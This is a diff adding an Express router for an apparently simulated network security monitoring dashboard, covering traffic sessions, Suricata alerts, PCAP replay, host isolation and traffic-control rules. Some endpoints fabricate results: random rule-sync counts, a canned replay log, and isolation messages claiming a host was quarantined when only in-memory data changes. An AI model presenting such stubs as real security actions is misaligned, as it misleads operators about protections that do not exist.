+        l4Header.writeUInt16BE(8 + payloadBuf.length, 4);
+      } else {
+        l4Header.writeUInt32BE(100000 + idx, 4);
+        l4Header.writeUInt32BE(200000 + idx, 8);
+        l4Header[12] = 0x50;
+        l4Header[13] = 0x18;
+        l4Header.writeUInt16BE(64240, 14);
+      }
+
+      packetBuffers.push(recHeader, ethHeader, ipHeader, l4Header, payloadBuf);
+    });
+
+    const fullBinary = Buffer.concat(packetBuffers);
+    res.setHeader('Content-Type', 'application/vnd.tcpdump.pcap');
+    res.setHeader('Content-Disposition', `attachment; filename="${exportName}"`);
+    return res.send(fullBinary);
+  });
+
+  // 3. Get Specific Session Details
+  router.get('/sessions/:id', (req: Request, res: Response) => {
+    const id = Number(req.params.id);
+    const session = sessions.find(s => s.id === id);
+    if (!session) {
+      return res.status(404).json({ error: 'Session not found' });
+    }
+    res.json({ success: true, session });
+  });
+
+  // 4. Add / Inject Live Traffic Session
+  router.post('/sessions', (req: Request, res: Response) => {
+    const newSession: TrafficSessionData = {
+      id: sessions.length ? Math.max(...sessions.map(s => s.id)) + 1 : 1,
+      stream_id: req.body.stream_id || `STR-${Date.now().toString().slice(-6)}`,
+      time: new Date().toTimeString().slice(0, 8),
+      src_ip: req.body.src_ip || '10.88.88.110',
+      src_port: Number(req.body.src_port) || 52000,
+      dst_ip: req.body.dst_ip || '10.88.88.200',
+      dst_port: Number(req.body.dst_port) || 443,
+      proto: req.body.proto || 'HTTPS',
+      app_proto: req.body.app_proto || 'TLS v1.3',
+      bytes_in: req.body.bytes_in || '4.2 KB',
+      bytes_out: req.body.bytes_out || '1.8 KB',
+      total_bytes_num: Number(req.body.total_bytes_num) || 6000,
+      packets: Number(req.body.packets) || 18,
+      duration_ms: Number(req.body.duration_ms) || 120,
+      threat_level: req.body.threat_level || 'Clean',
+      threat_desc: req.body.threat_desc,
+      action: req.body.action || 'Allowed',
+      geo_src: req.body.geo_src || { country: 'LAN (Corp)', flag: '🏢' },
+      geo_dst: req.body.geo_dst || { country: 'Internal', flag: '🛡️' },
+      tcp_flags: req.body.tcp_flags || 'SYN, ACK, PSH',
+      messages: req.body.messages || [],
+      hex_dump: req.body.hex_dump || [],
+      decoded_summary: req.body.decoded_summary
+    };
+
+    sessions.unshift(newSession);
+    if (sessions.length > 500) sessions.pop();
+
+    res.json({ success: true, session: newSession });
+  });
+
+  // 5. Suricata IDS Alerts List
+  router.get('/suricata/alerts', (req: Request, res: Response) => {
+    const { severity, category, limit } = req.query;
+    let list = [...suricataAlerts];
+
+    if (severity && severity !== 'ALL') {
+      list = list.filter(a => a.severity.toLowerCase() === String(severity).toLowerCase());
+    }
+    if (category) {
+      list = list.filter(a => a.category.toLowerCase().includes(String(category).toLowerCase()));
+    }
+
+    const limitNum = Number(limit) || 100;
+    res.json({ success: true, count: list.length, alerts: list.slice(0, limitNum) });
+  });
+
+  // 6. Suricata & Zeek Engine Rules Status
+  router.get('/suricata/rules-status', (req: Request, res: Response) => {
+    res.json({
+      success: true,
+      suricata: suricataState,
+      activeRules: suricataState.activeRules,
+      lastSyncTime: suricataState.lastSyncTime
+    });
+  });
+
+  // 7. Suricata Rule Signature Dynamic Synchronization
+  router.post('/suricata/sync-rules', (req: Request, res: Response) => {
+    const addedCount = Math.floor(Math.random() * 24) + 12;
+    suricataState.activeRules += addedCount;
+    suricataState.lastSyncTime = new Date().toISOString();
+
+    res.json({
+      success: true,
+      message: `Suricata IDS 威脅特徵庫同步成功！共更新 ${addedCount} 條 ET Pro 規則簽章 (CVE-2026 最新態勢)`,
+      activeRules: suricataState.activeRules,
+      lastSyncTime: suricataState.lastSyncTime
+    });
+  });
+
+  // 8. Dynamic Network Traffic Topology Dataset for D3
+  router.get('/topology', (req: Request, res: Response) => {
+    const nodesMap = new Map();
+    const links: any[] = [];
+
+    sessions.forEach(s => {
+      if (!nodesMap.has(s.src_ip)) {
+        nodesMap.set(s.src_ip, {
+          id: s.src_ip,
+          type: s.geo_src?.country.includes('LAN') || s.geo_src?.country.includes('Server') ? 'internal' : 'external',
+          flag: s.geo_src?.flag || '🏢',
+          threat: s.threat_level || 'Clean',
+          totalBytes: s.total_bytes_num,
+          activeStreams: 1
+        });
+      } else {
+        const n = nodesMap.get(s.src_ip);
+        n.totalBytes += s.total_bytes_num;
+        n.activeStreams += 1;
+        if (s.threat_level === 'Critical') n.threat = 'Critical';
+      }
+
+      if (!nodesMap.has(s.dst_ip)) {
+        nodesMap.set(s.dst_ip, {
+          id: s.dst_ip,
+          type: s.geo_dst?.country.includes('LAN') || s.geo_dst?.country.includes('Server') || s.geo_dst?.country.includes('Master') ? 'internal' : 'external',
+          flag: s.geo_dst?.flag || '🌐',
+          threat: s.threat_level || 'Clean',
+          totalBytes: s.total_bytes_num,
+          activeStreams: 1
+        });
+      } else {
+        const n = nodesMap.get(s.dst_ip);
+        n.totalBytes += s.total_bytes_num;
+        n.activeStreams += 1;
+      }
+
+      links.push({
+        source: s.src_ip,
+        target: s.dst_ip,
+        proto: s.proto,
+        threat: s.threat_level,
+        bytes: s.total_bytes_num
+      });
+    });
+
+    res.json({
+      success: true,
+      nodes: Array.from(nodesMap.values()),
+      links
+    });
+  });
+
+  // 9. Bandwidth Trends & Time Series
+  router.get('/bandwidth/trends', (req: Request, res: Response) => {
+    const hourly = [
+      { time: '00:00', inbound: 420, outbound: 280, dropped: 1.2 },
+      { time: '03:00', inbound: 310, outbound: 190, dropped: 0.8 },
+      { time: '06:00', inbound: 540, outbound: 410, dropped: 2.1 },
+      { time: '09:00', inbound: 1250, outbound: 890, dropped: 8.5 },
+      { time: '12:00', inbound: 1850, outbound: 1320, dropped: 14.2 },
+      { time: '15:00', inbound: 1680, outbound: 1190, dropped: 11.0 },
+      { time: '18:00', inbound: 1420, outbound: 980, dropped: 6.4 },
+      { time: '21:00', inbound: 890, outbound: 610, dropped: 3.2 }
+    ];
+
+    res.json({ success: true, hourly });
+  });
+
+  // 10. Top Talkers & Top Destinations
+  router.get('/top-talkers', (req: Request, res: Response) => {
+    const topTalkers = [
+      { ip: '10.88.88.202', name: 'DC-ActiveDirectory-01', type: 'Server', traffic: '165.6 MB', packets: '12,400', pct: 68, threat: 'Normal' },
+      { ip: '10.88.88.106', name: 'SOC-Analyst-WS07', type: 'Endpoint', traffic: '16.2 KB', packets: '48', pct: 12, threat: 'Critical' },
+      { ip: '10.88.88.102', name: 'SOC-Analyst-WS02', type: 'Endpoint', traffic: '10.3 KB', packets: '24', pct: 9, threat: 'High' },
+      { ip: '172.16.0.50', name: 'Guest-Client-WiFi', type: 'DMZ', traffic: '30.5 KB', packets: '142', pct: 7, threat: 'Medium' },
+      { ip: '198.51.100.89', name: 'Ext-Scanner-NL', type: 'External', traffic: '2.2 KB', packets: '12', pct: 4, threat: 'Critical' }
+    ];
+
+    const topDestinations = [
+      { ip: '10.88.88.200', name: 'App-PostgreSQL-Master', country: 'Local Data Center', flag: '🏢', asn: 'AS-PRIVATE', bytes: '165.6 MB' },
+      { ip: '185.220.101.45', name: 'Dark-C2-Host-NL', country: 'Russia (RU)', flag: '🇷🇺', asn: 'AS200052', bytes: '16.2 KB' },
+      { ip: '8.8.8.8', name: 'Google Public DNS', country: 'United States (US)', flag: '🇺🇸', asn: 'AS15169', bytes: '10.3 KB' },
+      { ip: '10.88.88.254', name: 'Core-Catalyst-9500', country: 'Core Switch MGMT', flag: '🔀', asn: 'AS-MGMT', bytes: '30.5 KB' }
+    ];
+
+    res.json({ success: true, topTalkers, topDestinations });
+  });
+
+  // 11. PCAP Replay Simulator Engine Runner
+  router.post('/replay/start', (req: Request, res: Response) => {
+    const { sampleName } = req.body;
+    const name = sampleName || 'Log4j_CVE-2021-44228_Exploit';
+
+    const events = [
+      `[INIT] 載入 PCAP 封包檔案: ${name}.pcapng (Virtual Tap0)`,
+      `[ENGINE] 初始化 Suricata 7.0.4 零拷貝 AF_PACKET 介面...`,
+      `[ENGINE] 載入 Zeek v6.2 協定深度分析引擎...`,
+      `[REPLAY] 重放進度 40%: 產生 1,200 個 TCP 封包，流經 Virtual Mirror Interface...`,
+      `[SURICATA] 命中特徵碼 SID 2029941 (ET TROJAN Lazarus APT C2 Beaconing)!`,
+      `[REPLAY] 重放進度 80%: 萃取 TLS JA3 指紋 ada70206e40642a3e4461f35503241d5`,
+      `[ZEEK] 建立 HTTP/SSL/DNS 關聯分析紀錄: ConnUID=C9X881`,
+      `[COMPLETE] PCAP 重放檢測完成！共重放 2,850 封包，觸發 2 筆 Critical 阻斷告警。`,
+      `[SUCCESS] 流量特徵已自動匯入至威脅沙盒分析資料庫。`
+    ];
+
+    res.json({
+      success: true,
+      sampleName: name,
+      packetsReplayed: 2850,
+      alertsTriggered: 2,
+      durationMs: 1800,
+      events
+    });
+  });
+
+  // 12. Toggle Live Packet Capture State
+  router.post('/capture/toggle', (req: Request, res: Response) => {
+    captureState.running = !captureState.running;
+    captureState.lastRefreshedAt = new Date().toISOString();
+    res.json({
+      success: true,
+      captureState,
+      message: captureState.running ? '已啟動即時零拷貝網路流量擷取 (AF_PACKET)' : '已暫停即時封包擷取探針'
+    });
+  });
+
+  // 13. Refresh TAP Probes and Cache
+  router.post('/refresh-cache', (req: Request, res: Response) => {
+    captureState.lastRefreshedAt = new Date().toISOString();
+    res.json({
+      success: true,
+      timestamp: captureState.lastRefreshedAt,
+      message: '全網 TAP 探針與流量快取已完成同步刷新'
+    });
+  });
+
+  // 14. Emergency Host Network Isolation
+  router.post('/traffic-control/isolate-host', (req: Request, res: Response) => {
+    const { ip, reason } = req.body;
+    if (!ip) {
+      return res.status(400).json({ error: 'ip is required' });
+    }
+
+    const isolateRule = {
+      id: `tc-iso-${Date.now().toString().slice(-4)}`,
+      name: `緊急硬體隔離: ${ip}`,
+      targetIp: ip,
+      action: "isolate" as const,
+      rateLimitMbps: 0,
+      protocol: "ALL",
+      status: "active",
+      createdAt: new Date().toISOString(),
+      matchedPackets: 0,
+      description: reason || 'SOC 緊急處置：NDR 觸發主機網路切斷與隔離保護'
+    };
+
+    trafficControlRules.unshift(isolateRule);
+
+    // Update sessions associated with this IP to Blocked
+    sessions.forEach(s => {
+      if (s.src_ip === ip || s.dst_ip === ip) {
+        s.action = 'Blocked';
+        s.threat_level = 'Critical';
+      }
+    });
+
+    res.json({
+      success: true,
+      isolatedIp: ip,
+      message: `已透過 802.1X NAC 與邊界 ACL 成功將主機 ${ip} 踢入隔離 VLAN (Quarantine VLAN 999)`,
+      rule: isolateRule
+    });
+  });
+
+  // 15. Traffic Control Rules CRUD
+  router.get('/traffic-control/rules', (req: Request, res: Response) => {
+    res.json({ success: true, rules: trafficControlRules });
+  });
+
+  router.post('/traffic-control/rules', (req: Request, res: Response) => {
+    const { name, targetIp, action, rateLimitMbps, protocol, description } = req.body;
+    if (!name || !targetIp) {
+      return res.status(400).json({ error: 'name and targetIp are required' });
+    }
+
+    const newRule = {
+      id: `tc-${Date.now().toString().slice(-4)}`,
+      name,
+      targetIp,
+      action: action || 'drop',
+      rateLimitMbps: Number(rateLimitMbps) || 0,
+      protocol: protocol || 'ALL',
+      status: 'active',
+      createdAt: new Date().toISOString(),
+      matchedPackets: 0,
+      description: description || '由 SOC 管理員自訂之 NDR 流量管控策略'
+    };
+
+    trafficControlRules.unshift(newRule);
+    res.json({ success: true, message: `流量策略 '${newRule.name}' 已成功套用至邊界與核心交換器`, rule: newRule });
+  });
+
+  router.patch('/traffic-control/rules/:id', (req: Request, res: Response) => {
+    const { id } = req.params;
+    const rule = trafficControlRules.find(r => r.id === id);
+    if (!rule) {
+      return res.status(404).json({ error: 'Rule not found' });
+    }
+
+    Object.assign(rule, req.body);
+    res.json({ success: true, rule });
+  });
+
+  router.delete('/traffic-control/rules/:id', (req: Request, res: Response) => {
+    const { id } = req.params;
+    const idx = trafficControlRules.findIndex(r => r.id === id);
+    if (idx === -1) {
+      return res.status(404).json({ error: 'Rule not found' });
+    }
+
+    const removed = trafficControlRules.splice(idx, 1)[0];
+    res.json({ success: true, message: `策略 ${removed.name} 已刪除` });
+  });
+
+  return router;
+}
+
